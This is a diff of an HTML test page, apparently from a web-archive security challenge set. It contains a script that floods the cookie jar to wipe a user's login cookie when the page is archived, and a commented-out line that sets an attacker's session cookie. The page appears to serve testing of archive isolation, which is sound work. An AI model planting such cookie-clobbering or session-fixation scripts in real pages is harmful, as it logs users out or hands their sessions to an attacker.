@@ -1,6 +1,6 @@
 <html>
-<head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<body>
+  <p>When archived, the script tag in this page should log out the user by deleting their session cookie.</p>
   <script>
     // fill up cookie jar to wipe login cookie
     for (i = 0; i < 1000; i++) {
@@ -10,8 +10,5 @@
     // bonus: log the user in as the attacker, if you have a valid session key:
     // document.cookie = "__wr_sesh=someone_elses_session_key; domain=warcgames.test; path=/";
   </script>
-</head>
-<body>
-  <p>When archived, the script tag in this page should log out the user by deleting their session cookie.</p>
 </body>
 </html>
